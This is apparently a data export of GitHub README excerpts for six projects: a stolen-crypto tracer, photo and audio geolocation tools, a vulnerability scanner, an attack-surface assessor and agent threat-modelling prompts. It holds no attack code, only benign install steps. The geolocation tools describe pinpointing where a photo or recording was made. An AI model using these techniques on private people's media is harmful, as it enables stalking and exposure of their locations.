 Trace stolen crypto like ZachXBT. No experience needed. 
Wake follows stolen crypto. Paste a wallet address or a transaction hash, and it traces the money hop by hop, across chains, to where it landed. If it reached an exchange, Wake tells you which one, because that exchange knows who owns the account and can freeze it when the police ask. Then it writes the report the police need, in one click.
Wake is free, runs on your PC and never asks for money to get anything back.
## Download
| System | File | |
|---|---|---|
| Windows 10 and 11 | [`stolen-crypto-tracer.zip`](https://github.com/PatchBuilderAmplify/stolen-crypto-tracer/releases/latest/download/stolen-crypto-tracer.zip) | One zip. No installer, no admin rights |
Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
`Main.exe` is code-signed, so Windows starts it without a warning. Keep
`Trace` next to it: they ship together.
## How to use
1. Paste the hash of a payment you sent, or the address you sent it to.
2. Press **Follow the money**.
3. Press **Make the report**, and take it to the police.
Wake finds your other payments to the same address on its own.

itens.descricao_en: An agent skill that finds where a photo was taken — OpenStreetMap geometry, elevation skylines, satellite imagery and street view — and shows its work. Works with Claude Code, Codex, Cursor, Gemini CLI, OpenCode and GitHub Copilot.
itens.readme:
# 🧭 geo-sleuth
**An agent skill that finds where a photo was taken — and shows its work.**
   Works with  
    …and any other agent that reads  SKILL.md  and runs shell commands. 
*No text. No plates. No landmarks. One bridge, one mountain. Located to within 2 m.*
---
## Quick start
```bash
npx skills add Oldcircle/geo-sleuth
```
Pick your agents when prompted. Then hand your agent a photo and say:
> find where this photo was taken
On first use, ask the agent to run `doctor.py` from the installed skill’s `scripts/` folder and address any failed checks (see [Requirements and setup](#requirements-and-setup)). That is the whole interface. The agent reads `SKILL.md`, runs the scripts, and comes back with the camera position, the direction it was facing and a satellite evidence image. Prefer to copy the folder yourself? See [Installation](#installation).
## Why geo-sleuth
- **One photo, one sentence.** Give your agent a photo and say *find where this photo was taken*. You get back the camera position, the direction it was facing, and a satellite evidence image.
- **It works when there is nothing to read.** No sign, no plate, no landmark: OpenStreetMap geometry, elevation data, satellite tiles and street view carry the search on their own.
- **Geometry instead of guesswork.** Pier spacing becomes a distance ruler, shadows become a bearing, a ridge line becomes a fingerprint that elevation data can be matched against.

itens.readme:
DOPPLERGEIST 
 Aircraft Doppler Audio Geolocation 
**DOPPLERGEIST** uses aircraft Doppler signatures in audio recordings and historical ADS-B flight tracks to rank possible recording locations. It includes a Python CLI and a local browser interface.
[Website](https://1337isnot1337.github.io/DOPPLERGEIST/) · [Examples](https://1337isnot1337.github.io/DOPPLERGEIST/examples.html) · [Install](#quickstart) · [How it works](#how-it-works) · [Results](#validation-and-results) · [Documentation](#documentation-and-references)
 Example: automatic MP3 analysis 
 Automatic MP3 analysis selected 466 aircraft and ranked 105 candidate locations. The first candidate was **476 m from an inferred reference** in a constrained geographic search and approximately 10-second clock window. The reference was not surveyed, and the result was inconclusive. [Experiment and ranking](docs/LIVERMORE_DEMO.md#all-aircraft-archive-mp3-ranking). 
## Capabilities
| Capability | What DOPPLERGEIST provides |
| --- | --- |
| **Automatic acoustic discovery** | Scans an entire recording for moving frequency tracks and groups related harmonics, without manually selecting event windows or frequency bands. |
| **Historical aircraft data** | Acquires and indexes ADSB.lol flight archives; caches reusable trajectory, terrain, and geoid inputs. |
| **Location search** | Compares predicted Doppler and sound-arrival patterns across candidate receiver locations, including evidence from multiple independent flyovers. |

# Codex Security
Codex Security helps you find, investigate, and fix vulnerabilities in your code.
Use its security workflows in Codex, or automate them with the
`@openai/codex-security` CLI and TypeScript SDK.
- **In Codex:** [choose a security workflow](docs/agent-workflows.md).
- **In a terminal:** [install the CLI and scan your repository](#quick-start).
- **In automation:** use the [TypeScript SDK](#typescript-sdk) or
  [GitHub Action](#github-actions).
## Features
- Scan repositories, selected paths, or Git changes. Deep scans repeat Standard scans and return their deduplicated findings.
- Validate candidate findings, generate patches, and verify existing fixes.
- Draft `SECURITY.md` policies and save threat models for later review.
- Browse saved scans and findings, identify duplicates, assess severity against
  your own rubric, and suggest owners from source and Git history.
- Import Semgrep, Snyk, and Wiz findings locally or publish them to Codex Security Cloud. [All scanner import guides](docs/scanner-imports/README.md).
- Export SARIF, JSON, or CSV, and publish findings to Linear or a findings service.
- Automate scans across repositories or project components, including in CI and
  containers.
## Use in Codex
Open your repository in a Codex session with the Codex Security plugin enabled,
then ask:
> Run a Codex Security scan on this repository, focusing on authentication and
> authorization. Return the saved report, source evidence, and coverage limits.

itens.descricao_en: AI-first external attack surface assessment with continuous discovery, evidence-based vulnerability validation, and developer-agent MCP integration.
itens.readme:
The most advanced external attack surface assessment you can get for free. 
  Type in your domain. cvENGINE finds everything you expose, then tells you which of today's exploited CVEs can actually hit you, with proof. 
  No license fee. No per-asset pricing. No black box. 100% open source and self-hosted.
---
## Know what you expose. Fix what's exploitable first.
Attack surface tools find assets. Vulnerability scanners find flaws. Threat feeds find CVEs. **cvENGINE runs all three as one continuous loop** and hands you a verdict instead of a pile of alerts. It answers the question that matters: *of everything exploited today, what do I have exposed?*
- **Total visibility.** Domains, subdomains, IPs, ports, products, versions, TLS, and technologies, discovered for you and kept current in one Shodan-style inventory.
- **Exploitation-ranked.** Every CVE is rated [fire, smoke, or ice](docs/FIRE-SMOKE-ICE.md) from the real exploitation sources, then matched to what you actually run.
- **Proof, not noise.** AI triage plus read-only checks that reproduce the finding, with the exact command recorded.
- **Nothing changes unseen.** New hosts, opened ports, version bumps, and changed front pages land on a timeline.
- **Yours completely.** One Docker Compose stack on your own server. Bring your own AI keys, or run a local model.

itens.descricao_en: Threat modeling for AI coding agents: point Claude Code, Codex or any agent at your repo and get an evidence-traced threat model. 36 architectures, 29 methods, MIT.
itens.readme:
Grim Prompter 
   Threat modeling for AI coding agents.  
  Point Claude Code, Codex or any coding agent at your repo. Get a threat model traced to your code.
**Threat model your project with Claude Code, Codex, or another coding agent.** Grim Prompter provides 36 architecture workflows and 29 method and analysis prompts. Your agent follows a structured review of the code, trust boundaries, threats, existing controls, and proposed mitigations, with evidence you can check.
Inspired by [Trim Reaper](https://github.com/jmanico/trim-reaper) and
[Dread Ledger](https://github.com/jmanico/dread-ledger).
## Install
Clone once, then link the `threat-model` skill into your agent. Check for an existing installation before running these commands.
```bash
git clone https://github.com/jmanico/grim-prompter.git ~/grim-prompter
# Claude Code
mkdir -p ~/.claude/skills && ln -s ~/grim-prompter/skills/threat-model ~/.claude/skills/threat-model
# Codex CLI
mkdir -p ~/.agents/skills && ln -s ~/grim-prompter/skills/threat-model ~/.agents/skills/threat-model
```
These commands use a local macOS or Linux shell. Keep the clone where it is, since the skill links to its prompts, and avoid duplicate installations. Start a new agent session when you're done. Installation details: [Codex](https://learn.chatgpt.com/docs/build-skills#where-codex-loads-local-skills) and [Claude Code](https://code.claude.com/docs/en/skills#choose-where-skills-load).
